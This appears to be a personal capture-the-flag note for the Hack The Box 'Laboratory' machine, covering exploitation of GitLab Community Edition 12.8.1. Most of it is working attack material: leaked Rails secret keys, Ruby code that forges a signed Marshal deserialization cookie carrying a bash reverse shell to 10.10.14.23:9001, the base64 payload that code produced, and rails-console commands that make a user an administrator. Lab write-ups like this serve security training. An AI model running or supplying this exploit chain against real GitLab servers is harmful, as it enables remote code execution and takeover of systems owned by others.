# gitlab.laboratory.htb
## Version
* # GitLab Community Edition [12.8.1](https://gitlab.com/gitlab-org/gitlab-foss/-/tags/v12.8.1)
![[Pasted image 20210417210554.png]]
## Vuln
* https://hackerone.com/reports/827052
![[Pasted image 20210417210243.png]]
## Secret Key	
``` Bash
production:
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
```

## Deserialized Payload
```Ruby
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar
erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/10.10.14.23/9001 0>&1'` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

### 10.10.14.23 9001
* BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidSNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjIzLzkwMDEgMD4mMSdgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--35132b9141933f8db9bf4545c83453178fbeaca1

![[Pasted image 20210417231027.png]]
![[Pasted image 20210417231115.png]]


### SSH Private Key Found in Dexter's Projects
```Ruby
gitlab-rails console
irb(main):016:0> u = User.find_by_username('hacker')
=> #<User id:6 @hacker>
irb(main):011:0> u = User.find(6)
=> #<User id:6 @hacker>
irb(main):012:0> u.admin = true
=> true
irb(main):013:0> u.save!
=> true
irb(main):014:0>+
```

![[Pasted image 20210418010040.png]]

![[Pasted image 20210418011026.png]]